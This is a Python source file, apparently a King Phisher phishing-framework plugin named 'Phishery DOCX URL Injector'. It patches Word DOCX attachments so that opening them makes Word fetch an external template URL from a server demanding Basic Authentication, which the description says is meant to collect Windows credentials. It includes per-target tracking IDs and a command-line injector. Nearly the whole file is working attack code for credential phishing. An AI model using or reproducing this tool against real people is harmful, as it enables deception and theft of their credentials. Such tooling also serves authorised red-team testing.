import argparse
import os
import random
import zipfile

import king_phisher.archive as archive
import king_phisher.client.plugins as plugins

PARSER_EPILOG = """\
If no output file is specified, the input file will be modified in place.
"""

def path_is_doc_file(path):
	if os.path.splitext(path)[1] not in ('.docx', '.docm'):
		return False
	if not zipfile.is_zipfile(path):
		return False
	return True

def phishery_inject(input_file, https_url, output_file=None):
	input_file = os.path.abspath(input_file)
	patches = {}
	rid = 'rId' + str(random.randint(10000, 99999))
	settings = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\r\n'
	settings += '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
	settings += '<Relationship Id="{rid}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="{target_url}" TargetMode="External"/>'
	settings += '</Relationships>'
	settings = settings.format(rid=rid, target_url=https_url)
	patches['word/_rels/settings.xml.rels'] = settings
	with zipfile.ZipFile(input_file, 'r') as zin:
		settings = zin.read('word/settings.xml')
	settings = settings.decode('utf-8')
	settings = settings.replace('/><w', "/><w:attachedTemplate r:id=\"{0}\"/><w".format(rid), 1)
	patches['word/settings.xml'] = settings
	archive.patch_zipfile(input_file, patches, output_file=output_file)

class Plugin(getattr(plugins, 'ClientPluginMailerAttachment', plugins.ClientPlugin)):
	authors = ['Ryan Hanson', 'Spencer McIntyre']
	title = 'Phishery DOCX URL Injector'
	description = """
	Use Phishery to inject Word Document Template URLs into DOCX files. This can
	be used in conjunction with a server page that requires Basic Authentication
	to collect Windows credentials. Note that for HTTPS URLs, the King Phisher
	server needs to be configured with a proper, trusted SSL certificate for
	the user to be presented with the basic authentication prompt.

	Phishery homepage: https://github.com/ryhanson/phishery
	"""
	homepage = 'https://github.com/securestate/king-phisher-plugins'
	options = [
		plugins.ClientOptionString(
			'target_url',
			'An optional target URL. The default is the phishing URL.',
			default='{{ url.webserver }}',
			display_name='Target URL'
		)
	]
	req_min_version = '1.9.0b5'
	version = '2.0.1'
	def initialize(self):
		mailer_tab = self.application.main_tabs['mailer']
		self.text_insert = mailer_tab.tabs['send_messages'].text_insert
		self.signal_connect('send-precheck', self.signal_send_precheck, gobject=mailer_tab)
		return True

	def _get_target_url(self, target):
		target_url = self.config['target_url'].strip()
		if target_url:
			return self.render_template_string(target_url, target=target, description='target url')
		target_url = self.application.config['mailer.webserver_url']
		if target is not None:
			target_url += '?id=' + target.uid
		return target_url

	def process_attachment_file(self, input_path, output_path, target=None):
		if not path_is_doc_file(input_path):
			return
		target_url = self._get_target_url(target)
		if target_url is None:
			self.logger.warning('failed to get the target url, can not inject into the docx file')
			return
		phishery_inject(input_path, target_url, output_file=output_path)
		self.logger.info('wrote the patched file to: ' + output_path + ('' if target is None else ' with uid: ' + target.uid))

	def signal_send_precheck(self, _):
		input_path = self.application.config['mailer.attachment_file']
		if not path_is_doc_file(input_path):
			self.text_insert('The attachment is not compatible with the phishery plugin.\n')
			return False
		target_url = self._get_target_url(None)
		if target_url is None:
			self.text_insert('The phishery target URL is invalid.\n')
			return False
		return True

def main():
	parser = argparse.ArgumentParser(description='Phishery DOCX URL Injector Utility', conflict_handler='resolve')
	parser.add_argument('-i', '--input', dest='input_file', required=True, help='the input file to inject into')
	parser.add_argument('-o', '--output', dest='output_file', help='the output file to write')
	parser.add_argument('-u', '--url', dest='target_url', required=True, help='the target url to inject into the input file')
	parser.epilog = PARSER_EPILOG
	arguments = parser.parse_args()

	phishery_inject(arguments.input_file, arguments.target_url, output_file=arguments.output_file)

if __name__ == '__main__':
	main()
